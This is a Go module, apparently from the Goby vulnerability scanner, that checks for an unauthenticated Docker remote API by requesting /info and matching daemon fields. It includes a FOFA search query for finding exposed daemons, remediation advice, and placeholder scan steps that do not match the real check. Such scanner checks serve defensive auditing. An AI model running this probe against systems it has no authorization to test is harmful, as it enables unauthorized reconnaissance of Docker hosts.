package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Docker remote unauthorized access vulnerability",
    "Description": "<p>Docker is a containerization platform for easily packaging, deploying, and running applications.</p><p>There is an unauthorized access vulnerability in Docker remote. An attacker can use this vulnerability to connect to the Docker Daemon to operate Docker, posing a threat to the Docker server.</p>",
    "Product": "docker-Daemon",
    "Homepage": "https://docs.docker.com/",
    "DisclosureDate": "2016-05-28",
    "PostTime": "2024-02-01",
    "Author": "shenqisimao@163.com",
    "FofaQuery": "protocol=\"docker\"",
    "GobyQuery": "protocol=\"docker\"",
    "Level": "2",
    "Impact": "<p>There is an unauthorized access vulnerability in Docker remote. An attacker can use this vulnerability to connect to the Docker Daemon to operate Docker, posing a threat to the Docker server.</p>",
    "Recommendation": "<p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "Docker remote 未授权访问漏洞",
            "Product": "docker-Daemon",
            "Description": "<p>Docker 是一种容器化平台，用于轻松地打包、部署和运行应用程序。<br></p><p>Docker remote 存在未授权访问漏洞，攻击者可利用该漏洞可连接 Docker Daemon 操作 Docker，对 Docker 服务器造成威胁。</p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Docker remote 存在未授权访问漏洞，攻击者可利用该漏洞可连接 Docker Daemon 操作 Docker，对 Docker 服务器造成威胁。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Docker remote unauthorized access vulnerability",
            "Product": "docker-Daemon",
            "Description": "<p>Docker is a containerization platform for easily packaging, deploying, and running applications.</p><p>There is an unauthorized access vulnerability in Docker remote. An attacker can use this vulnerability to connect to the Docker Daemon to operate Docker, posing a threat to the Docker server.</p>",
            "Recommendation": "<p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>There is an unauthorized access vulnerability in Docker remote. An attacker can use this vulnerability to connect to the Docker Daemon to operate Docker, posing a threat to the Docker server.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10810"
}`
	dockerInfoFlagwJzrlp := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		infoRequestConfig := httpclient.NewGetRequestConfig(`/info`)
		infoRequestConfig.VerifyTls = false
		infoRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, infoRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := dockerInfoFlagwJzrlp(hostInfo)
			success := resp != nil && resp.Header != nil && strings.Contains(strings.ToLower(resp.HeaderString.String()), `json`) && strings.Contains(resp.RawBody, `KernelVersion`) && strings.Contains(resp.RawBody, `RegistryConfig`) && strings.Contains(resp.RawBody, `DockerRootDir`)
			if success {
				ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, err := dockerInfoFlagwJzrlp(expResult.HostInfo); resp != nil && resp.Header != nil && strings.Contains(strings.ToLower(resp.HeaderString.String()), `json`) && strings.Contains(resp.RawBody, `KernelVersion`) && strings.Contains(resp.RawBody, `RegistryConfig`) && strings.Contains(resp.RawBody, `DockerRootDir`) {
				expResult.Output = resp.RawBody
				expResult.Success = true
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
